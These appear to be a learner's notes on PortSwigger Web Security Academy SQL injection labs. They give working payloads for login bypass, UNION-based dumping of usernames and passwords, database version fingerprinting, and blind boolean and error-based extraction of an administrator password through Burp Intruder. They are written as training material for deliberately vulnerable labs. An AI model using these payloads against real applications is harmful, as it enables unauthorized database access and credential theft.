### sql injection

hint: internal server error on http route.  
 '+OR+1=1-- #will query all #SELECT \* FROM products WHERE catergory = '' or 1+1--' equivalent.
ex: https://0aa000d504428d79c0e803da00430076.web-security-academy.net/filter?category=%27+OR+1=1--

### SQL injection vulnerability allowing login bypass

Use burp suite to intercept and modify login.
modify username with parameter administrator'--

### SQL union injection

2 requirements:
How many columns are being returned from the original query?
Which columns returned from the original query are of a suitable data type to hold the results from the injected query?

Continue adding null values until the error disappears and the response includes additional content containing the null values.  
ex: /filter?category='+UNION+SELECT+NULL,NULL-- HTTP/1.1  
-NULL is a special keyword that matches any data type.
-add NULLs if 'internal server error'
ex: '+UNION+SELECT+NULL,NULL,NULL--

### Lab: SQL injection UNION attack, finding a column containing text

Use Burp Suite to intercept and modify the request that sets the product category filter.
Determine the number of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the category parameter:
'+UNION+SELECT+NULL,NULL,NULL--
Try replacing each null with the random value provided by the lab, for example:
'+UNION+SELECT+'abcdef',NULL,NULL--
If an error occurs, move on to the next null and try that instead.

### SQL injection UNION attack, retrieving data from other tables

Find number of columns using NULL  
'+UNION+SELECT+NULL,NULL--  
Check columns for string values  
'+UNION+SELECT+'string','string2'--
Replace strings to search for username and password on table users
'+UNION+SELECT+username,+password+FROM+users--
right click - show response in browser, open new tab, paste.
get administrator password, and paste into login.

### SQL injection UNION attack, retrieving multiple values in a single column

intercept category, move to repeater  
in repeater find column size  
'+UNION+SELECT+NULL,'string'--  
locate string for username/password injection  
concat username and password into string starr is used to seperate values so you can find easily  
'+UNION+SELECT+NULL,username||'\*'||password+FROM+users--  
right click response show response in browser  
grab administrator password and login

### Lab: SQL injection attack, querying the database type and version on Oracle

Hint: There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual
ex: '+UNION+SELECT+NULL,NULL+FROM+dual--
check for string data types
'+UNION+SELECT+'string','string2'+FROM+dual--
Now look for version by using BANNER, NULL, and v$version from cheatsheet.
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--

### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

Hint: You can find some useful payloads on our SQL injection cheat sheet.
for this instead of using '--' at the end, it will be a hash #  
ex: '+UNION+SELECT+NULL#
find number of columns and check for strings
'+UNION+SELECT+'string2','string1'#
for microsoft @@version  
ex:'+UNION+SELECT+@@version,NULL#

### SQL injection attack, listing the database contents on non-Oracle databases

Hint: You can find some useful payloads on our SQL injection cheat sheet.  
proxy -> intercept -> repeater  
Non-oracle -- -> NULL NULL enumerate until columns found, then string search.  
Grab name of tables we want username/passwords table_name keyword information_schema.tables keyword  
ex: '+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--  
Show response in browser -> ctrl+f 'users' save user custom name
search column_name and information.schema.columns Where table_name= usercustomName
'+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users_zleagd'--
find name of username column and password column -> ex: password_ozeovi username_oiwhns
Then make UNION select with username, password, FROM, usertable
ex: '+UNION+SELECT+username_oiwhns,password_ozeovi+FROM+users_zleagd--
grab username/password for administrator
Login from Myaccount

### SQL injection attack, listing the database contents on Oracle

proxy-intercept-repeater - ORACLE (+FROM+dual) instead of --
enumerate nulls for columns '+UNION+SELECT+NULL,NULL+FROM+dual--
test strings - both are strings
Grab name of tables we want username/passwords table_name keyword all_tables keyword for ORACLE
ex: '+UNION+SELECT+table_name,NULL+FROM+all_tables--
get users table info - USERS_ICXPNX
search column_name and ORACLE: all_tab_columns using our username table to filter via WHERE clause
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ICXPNX'--
Then make UNION select with username, password, FROM, usertable
PASSWORD_TYRFNT
USERNAME_AIPDKN
'+UNION+SELECT+USERNAME_AIPDKN,PASSWORD_TYRFNT+FROM+USERS_ICXPNX--
Log in using administrator and password.

# BLIND SQL INJECTIONS

### Lab: Blind SQL injection with conditional responses

Hint: You can assume that the password only contains lowercase, alphanumeric characters.  
intercept, reload, repeater, see Cookie: tracking-ID=  
use booleans EX: Cookie: TrackingId=AfmV0i55jXUHch34' AND '1'='1;  
search for 'Welcome back' string shows that it's injectable  
if boolean is a false and doesn't give 500 error, it shows it's injectable.  
intercept -> repeater -> send to intruder  
intruder -> clear positions -> trackingId position, figure out length of password.  
ex: TrackingId=skE2Uot3KwnNY4m0' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a;  
highlight '1' click add in intruder  
ex:' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a; session=80ZmlNFRn852B56JEPNfCP8hWIoUQcZX  
payload -> type -> numbers -> from 1 to 30(super secure) step = 1.  
options tab -> grep match -> clear -> add "Welcome" we know logged in users see "Welcome back!"  
ex: TrackingId=skE2Uot3KwnNY4m0' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§1§)='a;  
intruder -> clusterbomb(two payloads)  
TrackingId=skE2Uot3KwnNY4m0' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a;  
select payloads  
Cookie: TrackingId=skE2Uot3KwnNY4m0' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§;  
payload 1 -> numbers 1-20(we know PW is 20 long from prior step) step 1  
payload 2 -> simple list ->payload options -> add a-z and 0-9  
Start attack, wait for 30 minutes, order results  
pw: i0tky7lpg6kfrvw0o0vf

### Blind SQL injection with conditional errors

Cookie: TrackingId=4KuVlET3kPLQfehN'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||';  
server Error  
change 1=2 ex: '||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||';  
send to intruder, clear  
get error back to find PW length ex: '||(SELECT CASE WHEN LENGTH(password)>1 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'  
select 1 and 'add' for payload ex: LENGTH(password)>§1§  
payload - numbers 1-30 step 1  
options are default  
Start attack, look for 500 status response = error response for me 19 errors 20 char long pw

now iterate over 20 chars to find out which char for all 20.  
intruder similar to last time.  
ex: '||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||';  
add a and first 1, ex: Cookie: TrackingId=4KuVlET3kPLQfehN'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||';  
Cluster bomb attack (two payloads)
payload 1 numbers 1-20 step 1, payload 2 a-z 0-9
look for any 500s and we'll get the password from internal server error. 500 = valid character
pw for me is:
